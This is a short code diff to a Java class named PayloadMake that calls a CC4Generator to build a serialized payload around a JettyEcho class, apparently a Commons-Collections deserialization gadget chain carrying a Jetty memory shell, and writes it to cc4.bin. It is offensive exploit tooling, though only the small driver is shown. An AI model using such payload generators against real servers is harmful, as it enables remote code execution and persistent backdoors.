@@ -13,9 +13,16 @@ import java.util.List;
  * @author Whoopsunix
  */
 public class PayloadMake {
-    public static void main(String[] args) throws Exception{
+    public static void main(String[] args) throws Exception {
+        cc4();
+    }
+
+    public static void cc4() throws Exception {
+        Class msmClass = JettyEcho.class;
         CC4Generator cc4Generator = new CC4Generator();
-        cc4Generator.make(JettyEcho.class);
+        String payload = cc4Generator.make(msmClass);
+        System.out.println(payload.length());
+        cc4Generator.makeFile(msmClass, "cc4.bin");
     }
 
     public void searchJetty() {
